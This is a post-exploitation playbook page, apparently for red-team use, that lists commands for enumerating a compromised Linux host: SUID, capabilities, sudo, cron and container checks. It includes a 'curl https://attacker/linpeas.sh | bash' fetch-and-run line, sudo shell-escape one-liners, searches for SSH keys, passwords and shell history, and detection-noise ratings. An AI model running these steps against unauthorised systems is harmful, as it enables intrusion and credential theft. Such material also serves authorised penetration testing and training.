# Linux Enumeration

tags: linux, enumeration, linpeas, pspy, suid, capabilities, sudo, cron, privilege-escalation, post-exploitation

## Objective
Enumerate a compromised Linux host for privilege escalation vectors: SUID binaries, capabilities, sudo misconfigs, cron jobs, and sensitive files.

## Prerequisites
- Shell access on Linux target (any privilege level)
- Ability to upload tools or use built-in commands

## Methodology

### Automated Enumeration
```bash
# LinPEAS — comprehensive (OPSEC: 0.7)
./linpeas.sh -a           # All checks

# LinPEAS stealth mode — no disk writes (OPSEC: 0.4)
./linpeas.sh -s

# Or run remotely without touching disk
curl https://attacker/linpeas.sh | bash
```

### Process Monitoring (OPSEC: 0.1 — passive, no root)
```bash
# Discover cron jobs, hidden scheduled tasks, running services
./pspy64 -pf -i 1000
```

### SUID Binaries
```bash
# Find all SUID binaries — cross-reference with GTFOBins
find / -perm -4000 -type f 2>/dev/null

# Common escalation targets:
# python, python3, perl, ruby, bash, env, find, nmap, vim, less, more
```

### Capabilities
```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Key capabilities for escalation:
# cap_setuid on python/perl/ruby → instant root
# cap_dac_read_search → read any file
# cap_sys_admin → container escape
```

### Sudo Misconfigurations
```bash
# List sudo permissions
sudo -l

# Check GTFOBins for any allowed commands
# Common escalation: sudo vim → :!bash, sudo find → -exec /bin/bash \;
```

### Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
# Check for writable scripts in cron paths
# Check for wildcard injection opportunities
```

### Sensitive File Enumeration
```bash
# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
ls -la /home/*/.ssh/

# Config files with credentials
find / -name "*.conf" -o -name "*.config" -o -name ".env" 2>/dev/null | head -50
grep -ri "password" /etc/ /opt/ /var/ 2>/dev/null | grep -v Binary

# History files
cat /home/*/.bash_history /root/.bash_history 2>/dev/null
```

### System Information
```bash
# Kernel version — check for kernel exploits
uname -r
cat /etc/os-release

# Network info
ip addr; ip route; ss -tlnp

# Docker/container detection
ls /.dockerenv 2>/dev/null && echo "CONTAINER DETECTED"
cat /proc/1/cgroup | grep -i docker
```

## Graph Reporting
- **Enrich host nodes**: OS, kernel version, architecture
- **Credential nodes**: from found SSH keys, config passwords, history files
- **Service nodes**: from running processes (pspy output)
- **Edges for escalation paths**: identified privesc vectors as notes

## OPSEC Notes

| Technique | Noise Rating |
|-----------|-------------|
| LinPEAS full | 0.7 |
| LinPEAS stealth | 0.4 |
| pspy | 0.1 |
| Manual enumeration | 0.2 |
| find commands | 0.2 |

**Detection**: File access auditing, process monitoring for enumeration tools, bash history logging.

## Sequencing
- **After**: Lateral Movement (need shell on Linux host)
- **Feeds →**: Linux Privilege Escalation (identified vectors)
